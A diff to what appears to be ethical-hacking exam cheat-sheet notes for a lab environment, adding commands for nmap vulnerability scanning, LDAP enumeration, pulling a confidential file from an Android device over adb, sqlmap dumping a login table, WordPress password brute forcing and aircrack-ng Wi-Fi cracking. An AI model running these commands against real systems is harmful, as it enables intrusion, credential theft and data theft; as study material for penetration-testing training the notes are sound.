@@ -3,6 +3,10 @@
 Geolocation BillCipher
 
 ```
+nmap --script vuln xx.xx.xx.xx
+```
+
+```
 ldapsearch -h 10.10.10.25 -x -s base namingcontexts
 ldapsearch -h 10.10.10.25 -x -b "cn=users,dc=CEHORG,dc=COM" "(objectclass=user)" | grep dn 
 ldapsearch -x -b "dc=cehorg,dc=com" "*" -h 10.10.10.25 | awk '/dn: / {print $2}' 
@@ -54,12 +58,18 @@ PhoneSploit
 
 9 - copy file /storage/self/primary/DCIM/capture.png or /sdcard/Download/confidential.txt
 
+```
+adb connect 172.16.0.21 5555
+adb shell
+adb pull /sdcard/Documents/confidential.txt
+```
+
 yersinia F2 x 1 q ==>Wireshark Transaction ID 0x643c9869
 
 ```
-sqlmap -batch -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="value" --dbs
-sqlmap -batch -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="value" -D moviescope --tables
-sqlmap -batch -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="value" -D moviescope -T User_Login --dump
+sqlmap --batch -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="value" --dbs
+sqlmap --batch -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="value" -D moviescope --tables
+sqlmap --batch -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="value" -D moviescope -T User_Login --dump
 ```
 
 wpscan -U adam -P password.txt --url http://cehorg.com
@@ -76,5 +86,8 @@ set ENUMERATE_USERNAMES false
 set verbose false
 run
 ```
-
-
+```
+aircrack-ng WEP.pcap
+aircrack-ng -a2 -w passwords.txt WPA2.pcap
+```
+ 
